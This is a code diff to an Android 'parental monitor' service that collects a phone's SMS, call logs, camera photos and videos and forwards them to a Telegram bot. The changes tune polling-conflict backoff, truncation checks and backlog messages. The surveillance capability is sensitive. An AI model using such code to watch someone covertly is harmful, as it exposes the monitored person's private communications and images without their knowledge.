@@ -980,12 +980,17 @@ class MonitoringService : Service() {
             return false
         }
         if (response.code() == 409) {
+            val selfConflict = try {
+                android.os.SystemClock.elapsedRealtime() - NotificationForwarderService.lastWakePollAt < 60_000L
+            } catch (_: Exception) {
+                false
+            }
             android.util.Log.w("MonitoringService", "getUpdates conflict: another consumer is polling, backing off")
-            commandBackoffUntil = android.os.SystemClock.elapsedRealtime() + 300_000L
+            commandBackoffUntil = android.os.SystemClock.elapsedRealtime() + (if (selfConflict) 60_000L else 300_000L)
             idlePolls = 4
             try {
                 val nowConflict = System.currentTimeMillis()
-                if (nowConflict - updateConflictNoticeAt > 3_600_000L) {
+                if (!selfConflict && nowConflict - updateConflictNoticeAt > 3_600_000L) {
                     updateConflictNoticeAt = nowConflict
                     serviceScope.launch {
                         sendToTelegram("Bot polling conflict (409): another client is reading updates, commands delayed. Stop other polling clients.")
@@ -2216,7 +2221,11 @@ class MonitoringService : Service() {
                 smsLastFull = page.size >= 100
                 if (page.size < 100) break
             }
-            val smsTruncated = smsPages >= 5 && smsLastFull
+            var smsTruncated = smsPages >= 5 && smsLastFull
+            if (smsTruncated) {
+                val probe = try { smsRepository.getNewSms(smsCursor) } catch (_: Exception) { emptyList() }
+                smsTruncated = probe.isNotEmpty()
+            }
             pendingSms.sortBy { it.id }
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${pendingSms.size} SMS messages")
 
@@ -2239,7 +2248,11 @@ class MonitoringService : Service() {
                 callLastFull = page.size >= 100
                 if (page.size < 100) break
             }
-            val callTruncated = callPages >= 5 && callLastFull
+            var callTruncated = callPages >= 5 && callLastFull
+            if (callTruncated) {
+                val probe = try { callLogRepository.getNewCalls(callTs, callId) } catch (_: Exception) { emptyList() }
+                callTruncated = probe.isNotEmpty()
+            }
             pendingCalls.sortWith(compareBy({ it.date }, { it.id }))
             if (pendingSms.isEmpty() && pendingCalls.isEmpty()) {
                 val wasDone = try { preferencesManager.initialSyncDone } catch (_: Exception) { true }
@@ -3105,7 +3118,7 @@ class MonitoringService : Service() {
             if (pendingPhotoCount() >= 10) {
                 serviceScope.launch {
                     if (reportResult) {
-                        sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
+                        sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent discarded; newest capture skipped.")
                     } else {
                         notifyCameraFailure("photo backlog full")
                     }
@@ -3948,7 +3961,7 @@ class MonitoringService : Service() {
             if (pendingVideoCount() >= MAX_VIDEO_KEPT) {
                 recordBusy.set(false)
                 serviceScope.launch {
-                    sendToTelegram("⚠️ Video backlog full (offline). Oldest unsent kept; newest recording skipped.")
+                    sendToTelegram("⚠️ Video backlog full (offline). Oldest unsent discarded; newest recording skipped.")
                 }
                 return
             }
